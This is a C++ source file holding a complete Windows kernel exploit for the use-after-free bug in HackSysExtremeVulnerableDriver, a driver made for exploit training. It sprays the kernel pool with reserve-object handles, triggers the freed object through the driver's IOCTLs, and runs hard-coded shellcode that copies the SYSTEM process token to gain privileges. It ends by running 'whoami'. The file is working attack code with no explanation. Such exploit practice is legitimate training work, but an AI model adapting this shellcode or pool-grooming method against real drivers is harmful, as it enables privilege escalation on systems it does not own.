#include <Windows.h>
#include <stdio.h>
#include <vector>
//offset 2084 + 4 + 4

std::vector<HANDLE> defrag_handles;
std::vector<HANDLE> sequential_handles;


typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*

typedef NTSTATUS(__stdcall* PNtAllocateReserveObject) (OUT PHANDLE hObject, IN POBJECT_ATTRIBUTES ObjectAttributes, IN DWORD ObjectType);

#define HEVD_IOCTL_ALLOC_UAF CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_USE_UAF CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_FREE_UAF CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_REPLACE_UAF CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)

int uaf()
{
    unsigned char shellcode[] = {
        0x60,
        0x64, 0xA1, 0x24, 0x01, 0x00, 0x00,
        0x8B, 0x40, 0x50,
        0x89, 0xC1,
        0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00,
        //---[Копируем токен System PID]
        0xBA, 0x04, 0x00, 0x00, 0x00,
        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
        0x2D, 0xB8, 0x00, 0x00, 0x00,
        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00,
        0x75, 0xED,
        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00,
        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00,
        //---[Восстанавливаем]
        0x61,                               // popad
        0x31, 0xC0,
        0xC3                               //ret
    };

    HANDLE device = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    printf("[+] Open device handle 0x%x\n", device);

    LPVOID exploit = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exploit, shellcode, sizeof(shellcode));



    /////////////////////////////////////////////////////////////

   // char* driverBuffer = (char*)VirtualAlloc(0, 60, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    char addr[] = "\xE4\xE2\xE4\xE2";
    LPVOID pExploit = &exploit;
    printf("[+] shellcode page address: 0x%x\n", exploit);
    printf("[+] shellcode pointer: 0x%x\n", pExploit);
    UCHAR driverBuffer[60] = { 0 };
    memcpy(driverBuffer, pExploit, 4);
    memset(&driverBuffer[4], '\x41', 55);
    memcpy(&driverBuffer[59], "\x00", 1);

    DWORD retn;
    HMODULE h = LoadLibraryA("ntdll.dll");
    PNtAllocateReserveObject NtAllocateReserveObject;
    NtAllocateReserveObject = (PNtAllocateReserveObject)GetProcAddress(h, "NtAllocateReserveObject");
    HANDLE nullhandle = 0;
    HANDLE handleArray1[10000] = { 0 };
    HANDLE handleArray2[5000] = { 0 };
    for (int i = 0; i < 10000; i++) {
        NtAllocateReserveObject((PHANDLE)&nullhandle, 0, 1);
        handleArray1[i] = nullhandle;
    }

    for (int i = 0; i < 5000; i++) {
        NtAllocateReserveObject((PHANDLE)&nullhandle, 0, 1);
        handleArray2[i] = nullhandle;
    }
    int count = 0;
    for (int i = 0; i < 5000; i += 2) {
        CloseHandle(handleArray2[i]);
        count++;
    }

    printf("%d freed\n", count);
    DeviceIoControl(device, HEVD_IOCTL_ALLOC_UAF, 0, 0, NULL, NULL, &retn, NULL);
    DeviceIoControl(device, HEVD_IOCTL_FREE_UAF, 0, 0, NULL, NULL, &retn, NULL);

    for (int i = 0; i < 5000; i++) {
        DeviceIoControl(device, HEVD_IOCTL_REPLACE_UAF, driverBuffer, 60, NULL, NULL, &retn, NULL);
    }
    DeviceIoControl(device, HEVD_IOCTL_USE_UAF, driverBuffer, 60, NULL, NULL, &retn, NULL);
    system("whoami");
    system("pause");
}
